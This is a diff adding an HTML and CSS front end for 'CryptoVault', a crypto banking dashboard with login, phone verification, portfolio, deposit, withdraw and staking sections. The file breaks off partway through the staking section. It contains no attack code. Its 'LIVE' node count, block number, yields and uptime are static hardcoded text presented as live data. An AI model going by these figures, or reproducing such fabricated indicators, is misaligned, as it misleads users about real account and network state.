@@ -1,0 +1,1800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoVault - Digital Banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: #0a0b0d;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        /* Login Screen */
+        .login-container {
+            min-height: 100vh;
+            display: flex;
+            background: linear-gradient(135deg, #0a0b0d 0%, #1a1a2e 100%);
+        }
+
+        /* Left Panel for Login */
+        .login-left-panel {
+            width: 40%;
+            background: rgba(26, 29, 41, 0.95);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        /* Right Panel for Branding */
+        .login-right-panel {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Live Node Map Animation */
+        .live-map-container {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at center, #0a0b0d 0%, #1a1d29 100%);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .live-map-container:hover {
+            transform: scale(1.02);
+        }
+
+        .map-title {
+            position: absolute;
+            top: 30px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00d4ff, #0099ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            z-index: 10;
+            text-shadow: 0 0 30px rgba(0, 212, 255, 0.5);
+        }
+
+        .world-map {
+            width: 100%;
+            height: 100%;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .map-dots {
+            position: absolute;
+            width: 80%;
+            height: 60%;
+        }
+
+        .node-dot {
+            position: absolute;
+            width: 6px;
+            height: 6px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 10px #00ff88;
+            animation: pulse-node 2s infinite;
+        }
+
+        @keyframes pulse-node {
+            0%, 100% { 
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% { 
+                transform: scale(1.5);
+                opacity: 0.7;
+            }
+        }
+
+        .connection-line {
+            position: absolute;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, #00d4ff, transparent);
+            animation: flow 3s linear infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes flow {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+
+        .branding-content {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .login-box {
+            background: transparent;
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .logo-section {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-section h1 {
+            font-size: 32px;
+            background: linear-gradient(135deg, #00d4ff, #0099ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #8892b0;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            background: rgba(255, 255, 255, 0.08);
+            border-color: #00d4ff;
+            box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.1);
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #00d4ff, #0099ff);
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.3);
+        }
+
+        /* Verification Modal */
+        .verification-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.9);
+            z-index: 2000;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .verification-modal.active {
+            display: flex;
+        }
+
+        .verification-content {
+            background: #1a1d29;
+            border-radius: 15px;
+            padding: 40px;
+            width: 90%;
+            max-width: 450px;
+            border: 2px solid rgba(0, 212, 255, 0.3);
+            animation: slideIn 0.3s;
+        }
+
+        .verification-title {
+            font-size: 24px;
+            color: #00d4ff;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .phone-display {
+            background: rgba(0, 212, 255, 0.1);
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .phone-display p {
+            color: #8892b0;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .phone-display .phone-number {
+            font-size: 24px;
+            color: #00ff88;
+            font-family: monospace;
+            letter-spacing: 2px;
+        }
+
+        .error-message {
+            color: #ff4757;
+            text-align: center;
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        /* Dashboard */
+        .dashboard {
+            display: none;
+            min-height: 100vh;
+            background: #0a0b0d;
+        }
+
+        .dashboard.active {
+            display: block;
+        }
+
+        /* Header */
+        .header {
+            background: rgba(26, 29, 41, 0.95);
+            padding: 15px 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-logo {
+            font-size: 24px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #00d4ff, #0099ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .header-user {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .user-info {
+            text-align: right;
+        }
+
+        .user-name {
+            font-size: 14px;
+            color: #8892b0;
+        }
+
+        .user-balance {
+            font-size: 18px;
+            font-weight: 600;
+            color: #00d4ff;
+        }
+
+        .btn-logout {
+            padding: 8px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 8px;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-logout:hover {
+            background: rgba(255, 71, 87, 0.2);
+            border-color: #ff4757;
+        }
+
+        /* Node Status Bar */
+        .node-status-bar {
+            background: rgba(26, 29, 41, 0.95);
+            padding: 15px 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .node-status-bar:hover {
+            background: rgba(0, 212, 255, 0.05);
+        }
+
+        .node-animation-container {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .node-icon-animated {
+            width: 40px;
+            height: 40px;
+            position: relative;
+        }
+
+        .node-core {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 20px;
+            height: 20px;
+            background: #00ff88;
+            border-radius: 50%;
+            box-shadow: 0 0 20px #00ff88;
+        }
+
+        .node-ring {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            border: 2px solid #00d4ff;
+            border-radius: 50%;
+            animation: rotate-ring 3s linear infinite;
+        }
+
+        @keyframes rotate-ring {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
+        .node-progress-info {
+            flex: 1;
+        }
+
+        .node-status-text {
+            color: #00ff88;
+            font-size: 14px;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .live-badge {
+            background: #00ff88;
+            color: #0a0b0d;
+            padding: 2px 8px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: bold;
+            animation: pulse-live 2s infinite;
+        }
+
+        .node-progress-bar {
+            background: rgba(255, 255, 255, 0.1);
+            height: 8px;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-top: 5px;
+        }
+
+        .node-progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #00ff88);
+            animation: progress-move 2s ease-in-out infinite;
+        }
+
+        @keyframes progress-move {
+            0% { width: 60%; }
+            50% { width: 90%; }
+            100% { width: 60%; }
+        }
+
+        @keyframes pulse-live {
+            0% { opacity: 1; }
+            50% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
+
+        /* Main Content */
+        .main-content {
+            display: flex;
+            padding: 30px;
+            gap: 30px;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 250px;
+            background: rgba(26, 29, 41, 0.95);
+            border-radius: 15px;
+            padding: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .nav-item {
+            padding: 12px 15px;
+            margin-bottom: 5px;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            color: #8892b0;
+        }
+
+        .nav-item:hover {
+            background: rgba(255, 255, 255, 0.05);
+            color: #00d4ff;
+        }
+
+        .nav-item.active {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.1), rgba(0, 153, 255, 0.1));
+            color: #00d4ff;
+            border: 1px solid rgba(0, 212, 255, 0.3);
+        }
+
+        .nav-icon {
+            width: 20px;
+            text-align: center;
+        }
+
+        /* Content Area */
+        .content-area {
+            flex: 1;
+            background: rgba(26, 29, 41, 0.95);
+            border-radius: 15px;
+            padding: 30px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .section {
+            display: none;
+        }
+
+        .section.active {
+            display: block;
+            animation: fadeIn 0.3s;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .section-title {
+            font-size: 24px;
+            margin-bottom: 25px;
+            color: #fff;
+        }
+
+        /* User Info Section */
+        .user-profile-container {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.05), rgba(0, 153, 255, 0.05));
+            border: 1px solid rgba(0, 212, 255, 0.2);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+
+        .user-profile-header {
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .user-avatar {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #00d4ff, #0099ff);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            font-weight: bold;
+        }
+
+        .user-details h2 {
+            color: #00d4ff;
+            margin-bottom: 5px;
+        }
+
+        .user-details p {
+            color: #8892b0;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .info-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 20px;
+        }
+
+        .info-label {
+            color: #8892b0;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 8px;
+        }
+
+        .info-value {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .countdown-container {
+            background: rgba(0, 255, 136, 0.1);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(0, 255, 136, 0.3);
+        }
+
+        .countdown-date {
+            color: #00d4ff;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+
+        .countdown-timer {
+            font-family: monospace;
+            font-size: 20px;
+            color: #00ff88;
+        }
+
+        .node-status-card {
+            background: linear-gradient(135deg, rgba(0, 255, 136, 0.05), rgba(0, 212, 255, 0.05));
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .node-status-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #00ff88;
+            animation: pulse-green 2s infinite;
+        }
+
+        @keyframes pulse-green {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 255, 136, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
+        }
+
+        .node-status-title {
+            font-size: 20px;
+            color: #00ff88;
+            font-weight: 600;
+        }
+
+        .validation-progress {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 20px 0;
+        }
+
+        .progress-bar {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            height: 10px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00d4ff, #00ff88);
+            width: 75%;
+            animation: progress-animation 2s ease-in-out;
+        }
+
+        @keyframes progress-animation {
+            from { width: 0; }
+        }
+
+        .node-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+        }
+
+        .btn-disabled {
+            padding: 12px 24px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #666;
+            cursor: not-allowed;
+            font-size: 16px;
+            font-weight: 600;
+            opacity: 0.5;
+            transition: all 0.3s;
+        }
+
+        .btn-disabled:hover {
+            background: rgba(255, 71, 87, 0.1);
+            border-color: rgba(255, 71, 87, 0.3);
+        }
+
+        .tooltip {
+            position: relative;
+        }
+
+        .tooltip-text {
+            visibility: hidden;
+            background: #1a1d29;
+            color: #ff4757;
+            text-align: center;
+            padding: 10px 15px;
+            border-radius: 8px;
+            border: 1px solid #ff4757;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+
+        .tooltip-text::after {
+            content: "";
+            position: absolute;
+            top: 100%;
+            left: 50%;
+            margin-left: -5px;
+            border-width: 5px;
+            border-style: solid;
+            border-color: #ff4757 transparent transparent transparent;
+        }
+
+        .tooltip:hover .tooltip-text,
+        .tooltip:active .tooltip-text {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        /* Portfolio Section */
+        .portfolio-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .coin-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 20px;
+            transition: all 0.3s;
+        }
+
+        .coin-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-color: rgba(0, 212, 255, 0.3);
+        }
+
+        .coin-header {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .coin-symbol {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .coin-balance {
+            font-size: 24px;
+            font-weight: bold;
+            color: #00d4ff;
+            margin-bottom: 5px;
+        }
+
+        .coin-value {
+            font-size: 14px;
+            color: #8892b0;
+        }
+
+        .coin-icon {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .btc-icon { background: #f7931a; }
+        .eth-icon { background: #627eea; }
+        .dot-icon { background: #e6007a; }
+        .ada-icon { background: #0033ad; }
+
+        /* Action Buttons */
+        .action-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .action-btn {
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .action-btn:hover {
+            background: rgba(0, 212, 255, 0.1);
+            border-color: #00d4ff;
+            transform: translateY(-2px);
+        }
+
+        .action-icon {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+
+        .action-label {
+            font-size: 14px;
+        }
+
+        .action-detail {
+            font-size: 11px;
+            color: #8892b0;
+            margin-top: 4px;
+        }
+
+        /* Transaction styles */
+        .transaction-list {
+            margin-top: 20px;
+        }
+
+        .transaction-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 10px;
+            margin-bottom: 10px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .transaction-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .transaction-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+        }
+
+        .transaction-icon.deposit { background: rgba(0, 255, 136, 0.1); color: #00ff88; }
+        .transaction-icon.withdraw { background: rgba(255, 71, 87, 0.1); color: #ff4757; }
+        .transaction-icon.stake { background: rgba(0, 212, 255, 0.1); color: #00d4ff; }
+
+        .transaction-details {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .transaction-type {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .transaction-date {
+            font-size: 12px;
+            color: #8892b0;
+        }
+
+        .transaction-amount {
+            font-size: 16px;
+            font-weight: 600;
+        }
+
+        .amount-positive { color: #00ff88; }
+        .amount-negative { color: #ff4757; }
+
+        /* Empty state */
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 15px;
+            border: 1px dashed rgba(255, 255, 255, 0.1);
+        }
+
+        .empty-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            opacity: 0.5;
+        }
+
+        .empty-title {
+            font-size: 20px;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .empty-description {
+            color: #8892b0;
+            margin-bottom: 25px;
+        }
+
+        /* Deposit/Withdraw forms */
+        .form-container {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 30px;
+            max-width: 500px;
+        }
+
+        .form-container input,
+        .form-container select {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+        }
+
+        /* Staking cards */
+        .staking-card {
+            background: linear-gradient(135deg, rgba(0, 212, 255, 0.05), rgba(0, 255, 136, 0.05));
+            border: 1px solid rgba(0, 212, 255, 0.3);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .staking-apy {
+            font-size: 32px;
+            color: #00ff88;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+
+        /* Pool cards */
+        .pool-card {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 20px;
+        }
+
+        .pool-stats {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .pool-stat {
+            text-align: center;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.03);
+            border-radius: 8px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .login-container {
+                flex-direction: column;
+            }
+            
+            .login-left-panel {
+                width: 100%;
+                border-right: none;
+                border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            }
+            
+            .login-right-panel {
+                display: none;
+            }
+            
+            .main-content {
+                flex-direction: column;
+            }
+            
+            .sidebar {
+                width: 100%;
+            }
+            
+            .portfolio-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div class="login-container" id="loginScreen">
+        <div class="login-left-panel">
+            <div class="login-box">
+                <div class="logo-section">
+                    <h1>💎 CryptoVault</h1>
+                    <p style="color: #8892b0;">Secure Digital Banking</p>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>User ID</label>
+                        <input type="text" id="username" placeholder="Enter your user ID" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label>Password</label>
+                        <input type="password" id="password" placeholder="Enter your password" required>
+                    </div>
+                    
+                    <button type="submit" class="btn-primary">LOGIN TO ACCOUNT</button>
+                </form>
+                
+                <div class="error-message" id="loginError" style="display: none;">
+                    Wrong user or password
+                </div>
+            </div>
+        </div>
+        
+        <div class="login-right-panel">
+            <div class="live-map-container" onclick="openLiveMap()">
+                <h2 class="map-title">🌍 Live Node Map</h2>
+                <div class="world-map">
+                    <div class="map-dots" id="mapDots">
+                        <!-- Dynamic nodes will be added here -->
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Phone Verification Modal -->
+    <div class="verification-modal" id="verificationModal">
+        <div class="verification-content">
+            <h2 class="verification-title">🔐 Security Verification</h2>
+            
+            <div class="phone-display">
+                <p>Verify your registered phone number:</p>
+                <div class="phone-number" id="hiddenPhone">0303****641</div>
+            </div>
+            
+            <form id="verificationForm">
+                <div class="form-group">
+                    <label>Enter Your Complete Phone Number</label>
+                    <input type="text" id="phoneVerify" placeholder="Enter phone number" required>
+                </div>
+                
+                <button type="submit" class="btn-primary">Verify & Continue</button>
+            </form>
+            
+            <div class="error-message" id="verifyError" style="display: none;">
+                Wrong captcha, check your phone number
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div class="dashboard" id="dashboard">
+        <!-- Header -->
+        <div class="header">
+            <div class="header-logo">💎 CryptoVault</div>
+            <div class="header-user">
+                <div class="user-info">
+                    <div class="user-name" id="userDisplay">Welcome</div>
+                    <div class="user-balance">$<span id="totalBalance">0.00</span></div>
+                </div>
+                <button class="btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </div>
+
+        <!-- Node Status Bar -->
+        <div class="node-status-bar" onclick="goToUserInfo()">
+            <div class="node-animation-container">
+                <div class="node-icon-animated">
+                    <div class="node-core"></div>
+                    <div class="node-ring"></div>
+                </div>
+                <div class="node-progress-info">
+                    <div class="node-status-text">
+                        Node Validation in Progress
+                        <span class="live-badge">LIVE</span>
+                    </div>
+                    <div class="node-progress-bar">
+                        <div class="node-progress-fill"></div>
+                    </div>
+                </div>
+                <div style="color: #8892b0; font-size: 12px;">
+                    Network: <span style="color: #00ff88;">12,847 Active Nodes</span> | 
+                    Block: <span style="color: #00d4ff;">#847,293</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Main Content -->
+        <div class="main-content">
+            <!-- Sidebar -->
+            <div class="sidebar">
+                <div class="nav-item active" onclick="showSection('portfolio')">
+                    <span class="nav-icon">📊</span>
+                    <span>Portfolio</span>
+                </div>
+                <div class="nav-item" onclick="showSection('userinfo')">
+                    <span class="nav-icon">👤</span>
+                    <span>User Info</span>
+                </div>
+                <div class="nav-item" onclick="showSection('deposit')">
+                    <span class="nav-icon">⬇️</span>
+                    <span>Deposit</span>
+                </div>
+                <div class="nav-item" onclick="showSection('withdraw')">
+                    <span class="nav-icon">⬆️</span>
+                    <span>Withdraw</span>
+                </div>
+                <div class="nav-item" onclick="showSection('staking')">
+                    <span class="nav-icon">💰</span>
+                    <span>Staking</span>
+                </div>
+                <div class="nav-item" onclick="showSection('pool')">
+                    <span class="nav-icon">🏊</span>
+                    <span>Liquidity Pool</span>
+                </div>
+                <div class="nav-item" onclick="showSection('node')">
+                    <span class="nav-icon">🖥️</span>
+                    <span>Node</span>
+                </div>
+                <div class="nav-item" onclick="showSection('transfer')">
+                    <span class="nav-icon">↔️</span>
+                    <span>Transfer</span>
+                </div>
+                <div class="nav-item" onclick="showSection('history')">
+                    <span class="nav-icon">📜</span>
+                    <span>History</span>
+                </div>
+            </div>
+
+            <!-- Content Area -->
+            <div class="content-area">
+                <!-- Portfolio Section -->
+                <div class="section active" id="portfolio">
+                    <h2 class="section-title">Your Portfolio</h2>
+                    
+                    <div class="portfolio-grid" id="portfolioGrid">
+                        <!-- Coins will be added dynamically -->
+                    </div>
+
+                    <h3 style="margin-top: 30px; margin-bottom: 20px;">Quick Actions</h3>
+                    <div class="action-grid">
+                        <div class="action-btn" onclick="showQuickAction('deposit')">
+                            <div class="action-icon">⬇️</div>
+                            <div class="action-label">Deposit</div>
+                            <div class="action-detail">Min: 0.001 BTC</div>
+                        </div>
+                        <div class="action-btn" onclick="showQuickAction('withdraw')">
+                            <div class="action-icon">⬆️</div>
+                            <div class="action-label">Withdraw</div>
+                            <div class="action-detail">Fee: 0.0005 BTC</div>
+                        </div>
+                        <div class="action-btn" onclick="showQuickAction('stake')">
+                            <div class="action-icon">💰</div>
+                            <div class="action-label">Stake</div>
+                            <div class="action-detail">APY: Up to 12.8%</div>
+                        </div>
+                        <div class="action-btn" onclick="showQuickAction('pool')">
+                            <div class="action-icon">🏊</div>
+                            <div class="action-label">Add to Pool</div>
+                            <div class="action-detail">APR: 24.5%</div>
+                        </div>
+                        <div class="action-btn" onclick="showQuickAction('node')">
+                            <div class="action-icon">🖥️</div>
+                            <div class="action-label">Run Node</div>
+                            <div class="action-detail">99.98% Uptime</div>
+                        </div>
+                        <div class="action-btn" onclick="showQuickAction('transfer')">
+                            <div class="action-icon">↔️</div>
+                            <div class="action-label">Transfer</div>
+                            <div class="action-detail">Instant P2P</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- User Info Section -->
+                <div class="section" id="userinfo">
+                    <h2 class="section-title">User Information</h2>
+                    <div id="userInfoContent">
+                        <!-- User info will be loaded dynamically -->
+                    </div>
+                </div>
+
+                <!-- Deposit Section -->
+                <div class="section" id="deposit">
+                    <h2 class="section-title">Deposit Cryptocurrency</h2>
+                    <div class="form-container">
+                        <h3 style="margin-bottom: 20px;">Generate Deposit Address</h3>
+                        <select id="depositCoin" style="width: 100%; padding: 12px; margin-bottom: 15px; background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; color: #fff;">
+                            <option value="BTC">Bitcoin (BTC)</option>
+                            <option value="ETH">Ethereum (ETH)</option>
+                            <option value="ADA">Cardano (ADA)</option>
+                            <option value="AVAX">Avalanche (AVAX)</option>
+                        </select>
+                        
+                        <div style="background: rgba(0, 212, 255, 0.1); padding: 20px; border-radius: 10px; border: 1px solid rgba(0, 212, 255, 0.3); margin: 20px 0;">
+                            <p style="color: #00d4ff; margin-bottom: 10px;">📍 Your Deposit Address:</p>
+                            <code id="depositAddress" style="background: rgba(0, 0, 0, 0.3); padding: 10px; border-radius: 5px; display: block; word-break: break-all; color: #00ff88;">
+                                bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+                            </code>
+                        </div>
+                        
+                        <p style="color: #8892b0; font-size: 14px;">⚠️ Minimum deposit: 0.001 BTC</p>
+                        <p style="color: #8892b0; font-size: 14px;">⏱️ Confirmations required: 3</p>
+                    </div>
+                </div>
+
+                <!-- Withdraw Section -->
+                <div class="section" id="withdraw">
+                    <h2 class="section-title">Withdraw Funds</h2>
+                    <div class="form-container">
+                        <h3 style="margin-bottom: 20px;">Request Withdrawal</h3>
+                        <input type="text" placeholder="Withdrawal Address" id="withdrawAddress">
+                        <input type="number" placeholder="Amount" id="withdrawAmount" step="0.0001">
+                        <select id="withdrawCoin">
+                            <option value="BTC">Bitcoin (BTC)</option>
+                            <option value="ETH">Ethereum (ETH)</option>
+                            <option value="ADA">Cardano (ADA)</option>
+                            <option value="AVAX">Avalanche (AVAX)</option>
+                        </select>
+                        <button class="btn-primary" onclick="processWithdraw()">Process Withdrawal</button>
+                        
+                        <div style="margin-top: 20px; padding: 15px; background: rgba(255, 71, 87, 0.1); border-radius: 8px; border: 1px solid rgba(255, 71, 87, 0.3);">
+                            <p style="color: #ff4757; font-size: 14px;">⚠️ Withdrawal Fee: 0.0005 BTC</p>
+                            <p style="color: #ff4757; font-size: 14px;">📅 Processing Time: 24-48 hours</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Staking Section -->
+                <div class="section" id="staking">
+                    <h2 class="section-title">Staking Rewards</h2>
+                    
+                    <div class="staking-card">
+                        <h3>🎯 Cardano (ADA) Staking</h3>
+                        <div class="staking-apy">5.2% APY</div>
+                        <p style="color: #8892b0;">Current Staked: 0 ADA</p>
+                        <p style="color: #8892b0;">Rewards Earned: 0 ADA</p>
+                        <p style="color: #8892b0;">Next Reward: In 5 days</p>
+                        <button class="btn-primary" style="margin-top: 20px;">Stake ADA</button>
+                    </div>
+                    
+                    <div class="staking-card">
+                        <h3>🔺 Avalanche (AVAX) Staking</h3>
+                        <div class="staking-apy">8.7% APY</div>
+                        <p style="color: #8892b0;">Current Staked: 0 AVAX</p>
